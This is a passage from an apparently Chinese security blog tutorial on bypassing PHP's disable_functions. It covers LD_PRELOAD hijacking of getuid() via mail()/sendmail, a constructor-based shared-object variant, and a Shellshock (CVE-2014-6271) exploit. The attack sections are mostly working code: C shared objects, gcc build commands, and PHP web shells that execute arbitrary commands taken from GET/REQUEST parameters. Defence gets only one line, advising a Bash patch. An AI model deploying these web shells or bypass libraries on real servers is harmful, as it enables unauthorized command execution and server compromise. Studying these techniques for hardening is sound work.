evil.so，以便后续启动新进程时优先加载该共享对象；</li><li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；</li><li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li></ul><h4 id="调用过程分析"><a href="#调用过程分析" class="headerlink" title="调用过程分析"></a>调用过程分析</h4><p>先调用如下命令可查看sendmail程序可能调用的系统API明细：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># readelf -Ws /usr/sbin/sendmail | grep getuid</span></span><br><span class="line">    90: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 (3)</span><br></pre></td></tr></table></figure><p>或如下命令也可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># nm -D /usr/sbin/sendmail 2&gt;&amp;1 | grep getuid</span></span><br><span class="line">                 U getuid</span><br></pre></td></tr></table></figure><p>由于程序运行时会根据命令行选项、运行环境作出不同反应，导致真正运行时调用的API可能只是readelf查看的子集，通过如下命令跟踪查看sendmail程序的实际API调用情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># strace -f /usr/sbin/sendmail 2&gt;&amp;1 | grep -A5 -B5 getuid</span></span><br><span class="line">fstat(3, &#123;st_mode=S_IFCHR|0666, st_rdev=makedev(1, 9), ...&#125;) = 0</span><br><span class="line">getrusage(0x1 /* RUSAGE_??? */, &#123;ru_utime=&#123;0, 0&#125;, ru_stime=&#123;0, 4000&#125;, ...&#125;) = 0</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"#\315o=\302\4\363h\252\273\332R\364\261skcQ\267|B&amp;j\177\210\330q\0379\f\7\216"</span>, 32) = 32</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"\351o\235\336\220\364BVj\346\261\244\200\34S\207\332f\230\231\234V*\302BHg\304\3108jK"</span>, 32) = 32</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"9\21\203\254\35,\306\241"</span>, 8)  = 8</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">getrlimit(RLIMIT_NOFILE, &#123;rlim_cur=65535, rlim_max=65535&#125;) = 0</span><br><span class="line">fstat(0, &#123;st_mode=S_IFCHR|0600, st_rdev=makedev(136, 2), ...&#125;) = 0</span><br><span class="line">fstat(1, &#123;st_mode=S_IFIFO|0600, st_size=0, ...&#125;) = 0</span><br><span class="line">fstat(2, &#123;st_mode=S_IFIFO|0600, st_size=0, ...&#125;) = 0</span><br></pre></td></tr></table></figure><p>可以看到，sendmail程序确实调用了getuid()函数。</p><p>接着用<code>man 2 getuid</code>查看函数原型：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/7.png" alt=""></p><p>现在知道sendmail程序会调用getuid()函数以及getuid()函数的原型，剩下的问题就是寻找在PHP中除了那些命令执行函数外会调用sendmail程序的函数了。</p><p>sendmail程序，顾名思义，就是发送邮件的功能，由此自然而然地联想到PHP的mail()函数，写段测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后运行如下命令查看mail()是否启动新进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve</span></span><br><span class="line">execve(<span class="string">"/usr/bin/php"</span>, [<span class="string">"php"</span>, <span class="string">"mail.php"</span>], [/* 24 vars */]) = 0</span><br><span class="line">brk(NULL)                               = 0x562bdab47000</span><br><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">--</span><br><span class="line">[pid 29094] &lt;... dup2 resumed&gt; )        = 0</span><br><span class="line">[pid 29093] wait4(29094,  &lt;unfinished ...&gt;</span><br><span class="line">[pid 29094] execve(<span class="string">"/bin/sh"</span>, [<span class="string">"sh"</span>, <span class="string">"-c"</span>, <span class="string">"/usr/sbin/sendmail -t -i "</span>], [/* 24 vars */]) = 0</span><br><span class="line">[pid 29094] brk(NULL)                   = 0x557087f3b000</span><br><span class="line">[pid 29094] access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK) = -1 ENOENT (No such file or directory)</span><br><span class="line">--</span><br><span class="line">strace: Process 29095 attached</span><br><span class="line">[pid 29094] wait4(-1,  &lt;unfinished ...&gt;</span><br><span class="line">[pid 29095] execve(<span class="string">"/usr/sbin/sendmail"</span>, [<span class="string">"/usr/sbin/sendmail"</span>, <span class="string">"-t"</span>, <span class="string">"-i"</span>], [/* 24 vars */]) = 0</span><br><span class="line">[pid 29095] brk(NULL)                   = 0xe2b000</span><br><span class="line">[pid 29095] fcntl(0, F_GETFD)           = 0</span><br></pre></td></tr></table></figure><p>简单分析一下，第一个execve是启动PHP解释器而已，除此之外必须找到第二个execve，没有则说明并未启动新进程；这里第二和第三个execve都是直接或间接调用系统sendmail程序，这就对了。</p><p>注意一点，通过/bin/sh方式调用sendmail的execve，我们在看/bin/sh程序的调用哪些API时会发现，其实也是调用了getuid()：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># strace -f /bin/sh 2&gt;&amp;1 | grep -A5 -B5 getuid</span></span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x7fed795b5700) = 0</span><br><span class="line">mprotect(0x7fed79392000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x5567a6f01000, 8192, PROT_READ) = 0</span><br><span class="line">mprotect(0x7fed795c1000, 4096, PROT_READ) = 0</span><br><span class="line">munmap(0x7fed795b7000, 37845)           = 0</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">getpid()                                = 29796</span><br><span class="line">rt_sigaction(SIGCHLD, &#123;0x5567a6cf5540, ~[RTMIN RT_1], SA_RESTORER, 0x7fed790074b0&#125;, NULL, 8) = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">brk(NULL)                               = 0x5567a87fe000</span><br></pre></td></tr></table></figure><p>也就是说，<strong>如果别的环境和我本地的一样，在mail()中存在启动execve调用了/bin/sh程序来间接调用sendmail的这种情况，即使目标系统未安装或未开启sendmail程序，我仍然可以通过PHP的mail()函数来触发调用了/bin/sh程序的execve，从而调用getuid()达到执行劫持函数的目的。</strong></p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>编写test.c，劫持getuid()函数，获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由EVIL_CMDLINE环境变量获取的系统命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">        unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">        system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个共享库中的getuid()被调用时，尝试加载payload()函数执行命令。</p><p>接着用以下语句编译C文件为共享对象文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC test.c -o test.so</span><br></pre></td></tr></table></figure><p>最后编写test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里接受3个参数，一是cmd参数，待执行的系统命令；二是outpath参数，保存命令执行输出结果的文件路径，便于在页面上显示，另外该参数，你应注意web是否有读写权限、web是否可跨目录访问、文件将被覆盖和删除等几点；三是sopath参数，指定劫持系统函数的共享对象的绝对路径。</p><p>这里通过putenv()函数将LD_PRELOAD环境变量设置为恶意的test.so、将自定义的EVIL_CMDLINE环境变量赋值为要执行的命令；然后调用mail()函数触发sendmail()，再通过sendmail()触发getuid()从而使恶意的test.so被加载执行；最后再输出内容到页面上并删除临时存放命令执行结果的文件。</p><p>访问test.php，输入相应的参数即可执行成功：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/5.png" alt=""></p><p>其实本地测试发现，即使Linux系统未安装或未启用sendmail，还是能够成功触发Bypass，这和前面分析的mail()会启动/bin/sh进而调用getuid()有关，验证了这种方法的特殊性。</p><h3 id="Method2——劫持启动进程"><a href="#Method2——劫持启动进程" class="headerlink" title="Method2——劫持启动进程"></a>Method2——劫持启动进程</h3><h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>第一种方法是劫持getuid()，是较为常用的方法，但存在缺陷：</p><ul><li>目标Linux未安装或为启用sendmail；</li><li>即便目标可以启用sendmail，由于未将主机名添加进hosts中，导致每次运行sendmail都要耗时半分钟等待域名解析超时返回，www-data也无法将主机名加入hosts；</li></ul><blockquote><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p><p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p></blockquote><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着用以下语句编译C文件为共享对象文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</span><br></pre></td></tr></table></figure><p>bypass_disablefunc.php，代码和test.php一致：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问bypass_disablefunc.php，输入参数设置LD_PRELOAD环境变量和要执行的命令的值，页面直接返回命令执行结果：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/6.png" alt=""></p><h2 id="0x05-利用PHP-7-4-FFI绕过"><a href="#0x05-利用PHP-7-4-FFI绕过" class="headerlink" title="0x05 利用PHP 7.4 FFI绕过"></a>0x05 利用PHP 7.4 FFI绕过</h2><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>也就是说，通过PHP调用C的命令执行函数来绕过。</p><p>具体原理和利用可参考<a href="https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/" target="_blank" rel="noopener">《从RCTF nextphp看PHP7.4的FFI绕过disable_functions》</a>。</p><h2 id="0x06-利用Bash破壳（CVE-2014-6271）漏洞绕过"><a href="#0x06-利用Bash破壳（CVE-2014-6271）漏洞绕过" class="headerlink" title="0x06 利用Bash破壳（CVE-2014-6271）漏洞绕过"></a>0x06 利用Bash破壳（CVE-2014-6271）漏洞绕过</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>这种利用方法的前提是目标OS存在Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考<a href="https://www.freebuf.com/news/48331.html" target="_blank" rel="noopener">《破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一  》</a>。</p><p>在我本地的Metasploitable2虚拟机环境中，是存在Bash破壳漏洞的：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/9.png" alt=""></p><h3 id="基本原理-2"><a href="#基本原理-2" class="headerlink" title="基本原理"></a>基本原理</h3><p>假设目标OS存在Bash破壳漏洞后，我们再来看看PHP到底是哪些函数调用触发到了Bash博客漏洞的。</p><p>这里我们以mail()函数作为例子，当然其他一些函数也可以，原理一致，可以自行分析。</p><p>PHP的mail()函数用于发送邮件，提供了3个必选参数和2个可选参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) : bool</span><br></pre></td></tr></table></figure><p>这里我们主要看最后一个参数，PHP官方手册上对最后一个参数的说明：</p><blockquote><p>The additional_parameters parameter can be used to pass an additional parameter to the program configured to use when sending mail using the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option.</p><p>The user that the webserver runs as should be added as a trusted user to the sendmail configuration to prevent a ‘X-Warning’ header from being added to the message when the envelope sender (-f) is set using this method. For sendmail users, this file is /etc/mail/trusted-users.</p></blockquote><p>简单地说，就是这个参数可以通过添加附加的命令作为发送邮件时候的配置，比如使用-f参数可以设置邮件发件人等，官方文档在范例Example #3也有所演示，具体可以参考官方文档：<a href="http://php.net/manual/zh/function.mail.php。" target="_blank" rel="noopener">http://php.net/manual/zh/function.mail.php。</a></p><p>为什么关注最后第五个参数呢？</p><p>我们看到在PHP mail()函数的源代码mail.c中，有如下代码片段，其中mial()函数的第五个参数即为extra_cmd：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (extra_cmd != <span class="keyword">NULL</span>) &#123;</span><br><span class="line">spprintf(&amp;sendmail_cmd, <span class="number">0</span>,<span class="string">"%s %s"</span>, sendmail_path, extra_cmd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sendmail_cmd = sendmail_path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当extra_cmd（用户传入的一些额外参数）存在的时候，调用spprintf()将sendmail_path和extra_cmd组合成真正执行的命令行sendmail_cmd。 然后将sendmail_cmd丢给popen()执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">sendmail = popen_ex(sendmail_cmd,<span class="string">"wb"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Since popen() doesn't indicate if theinternal fork() doesn't work</span></span><br><span class="line"><span class="comment">    *(e.g. the shell can't be executed) we explicitly set it to 0 to be</span></span><br><span class="line"><span class="comment">    *sure we don't catch any older errno value. */</span></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    sendmail = popen(sendmail_cmd,<span class="string">"w"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果系统默认sh是bash，popen()会派生bash进程，而我们刚才提到的CVE-2014-6271漏洞，直接就导致我们可以利用mail()函数执行任意命令，绕过disable_functions的限制。</p><p>同样，我们搜索一下php的源码，可以发现，明里调用popen派生进程的php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。也就是说，单单禁用mail()函数进行黑名单的防御，是很容易被Bypass的。</p><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>Exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>); </span><br><span class="line">   putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在我本地的Metasploitable2虚拟机测试，其存在Bash破壳漏洞，直接Bypass getshell：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/10.png" alt=""></p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/8.png" alt=""></p><h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>修补Bash破壳漏洞。</p><h2 id="0x07-利用imap-open-绕过"><a href="#0x07-利用imap-open-绕过" class="headerlink" title="0x07 利用imap_open()绕过"></a>0x07 利用imap_open()绕过</h2><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>安装PHP的imap扩展：<code>apt-get install php-imap</code>；在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。</p><p>成功配置好环境后，在phpinfo中会看到如下信息：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/11.png" alt=""></p><h3 id="基本原理-3"><a href="#基本原理-3" class="headerlink" title="基本原理"></a>基本原理</h3><blockquote><p>PHP 